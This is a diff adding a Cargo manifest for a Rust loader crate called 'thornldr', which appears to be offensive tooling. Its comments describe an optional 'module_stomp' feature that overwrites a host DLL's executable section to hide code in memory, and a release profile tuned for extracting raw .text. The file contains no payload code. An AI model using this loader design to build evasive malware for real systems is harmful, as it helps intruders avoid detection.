@@ -1,0 +1,26 @@
+[package]
+name     = "thornldr"
+version  = "0.1.0"
+edition  = "2021"
+build    = "build.rs"
+autolib  = false          # prevent src/lib.rs being auto-detected as a lib target
+
+[features]
+# module_stomp: walk the PEB in-process and overwrite a host DLL's RX section
+# instead of allocating private memory.  Disabled by default so the baseline
+# loader uses a plain VirtualAlloc RW → map → per-section VirtualProtect flow.
+# Enable with: cargo build --release --features module_stomp
+module_stomp = []
+
+[[bin]]
+name = "thornldr"
+path = "src/lib.rs"
+
+[profile.release]
+opt-level       = "z"
+panic           = "abort"
+lto             = "fat"
+codegen-units   = 1
+strip           = false   # keep section names so objcopy can extract .text
+debug           = false
+overflow-checks = false
